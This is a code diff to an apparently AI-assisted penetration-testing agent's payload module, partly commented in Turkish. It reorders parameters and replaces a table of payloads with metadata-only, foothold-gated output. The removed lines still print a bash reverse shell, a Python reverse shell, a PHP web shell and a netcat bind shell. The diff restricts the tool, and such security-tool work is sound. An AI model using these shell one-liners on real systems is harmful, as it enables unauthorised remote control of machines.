@@ -41,7 +41,7 @@ def check_payload_preconditions(state: 'AgentState') -> tuple[bool, str]:
 # -------------------------
 # Reverse Shell Payload
 # -------------------------
-async def reverse_shell(target_ip="127.0.0.1", target_port=4444, state: 'AgentState' = None):
+async def reverse_shell(state: 'AgentState', target_ip="127.0.0.1", target_port=4444):
     """STATE-AWARE Reverse shell - FOOTHOLD GEREKLİ"""
     print(f"[Payload] Reverse shell baslatiliyor: {target_ip}:{target_port}")
     
@@ -90,7 +90,7 @@ async def reverse_shell(target_ip="127.0.0.1", target_port=4444, state: 'AgentSt
 # -------------------------
 # Bind Shell Payload
 # -------------------------
-async def bind_shell(listen_ip="0.0.0.0", listen_port=5555, state: 'AgentState' = None):
+async def bind_shell(state: 'AgentState', listen_ip="0.0.0.0", listen_port=5555):
     """STATE-AWARE Bind shell - FOOTHOLD GEREKLİ"""
     print(f"[Payload] Bind shell dinleniyor: {listen_ip}:{listen_port}")
     
@@ -127,7 +127,7 @@ async def handle_client(reader, writer):
 # -------------------------
 # Command Execution Payload
 # -------------------------
-def execute_command(cmd="id", state: 'AgentState' = None):
+def execute_command(state: 'AgentState', cmd="id"):
     if state is None:
         raise RuntimeError("State is required for payload command execution")
     # Direct command execution is forbidden; must use ToolSelector via agent tool execution path
@@ -136,7 +136,7 @@ def execute_command(cmd="id", state: 'AgentState' = None):
 # -------------------------
 # AI Destekli Payload Önerisi
 # -------------------------
-async def ai_payload_advice(exploit_output, state: 'AgentState' = None):
+async def ai_payload_advice(state: 'AgentState', exploit_output):
     print("[Payload] AI öneri motoru çalışıyor...")
     if state is None:
         raise RuntimeError("State is required for AI payload advice")
@@ -154,7 +154,7 @@ async def ai_payload_advice(exploit_output, state: 'AgentState' = None):
 # -------------------------
 # Generate Payload (Helper)
 # -------------------------
-def generate_payload(payload_type, lhost=None, lport=4444, state: 'AgentState' = None):
+def generate_payload(state: 'AgentState', payload_type, lhost=None, lport=4444):
     """
     Generate various payload types
     
@@ -178,30 +178,9 @@ def generate_payload(payload_type, lhost=None, lport=4444, state: 'AgentState' =
     if not can_execute:
         return {"error": reason, "blocked": True}
 
-    payloads = {
-        "reverse_shell_bash": {
-            "code": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" if lhost else "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
-            "platform": "Linux",
-            "description": "Bash reverse shell"
-        },
-        "reverse_shell_python": {
-            "code": f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{lhost}\',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"' if lhost else 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((LHOST,LPORT));..."',
-            "platform": "Linux/Windows",
-            "description": "Python reverse shell"
-        },
-        "web_shell_php": {
-            "code": "<?php system($_GET['cmd']); ?>",
-            "platform": "PHP Web Server",
-            "description": "Simple PHP web shell"
-        },
-        "bind_shell_nc": {
-            "code": f"nc -lvnp {lport} -e /bin/bash",
-            "platform": "Linux",
-            "description": "Netcat bind shell"
-        }
-    }
-    
-    return payloads.get(payload_type.lower(), {
-        "error": f"Unknown payload type: {payload_type}",
-        "available": list(payloads.keys())
-    })
+    allowed_types = ["reverse_shell_bash", "reverse_shell_python", "web_shell_php", "bind_shell_nc"]
+    if not state.has_foothold:
+        return {"error": "FORBIDDEN: Payload requires foothold first", "blocked": True}
+    if payload_type.lower() not in allowed_types:
+        return {"error": f"Unknown payload type: {payload_type}", "available": allowed_types}
+    return {"type": payload_type, "lhost": lhost, "lport": lport, "success": True, "meta_only": True}
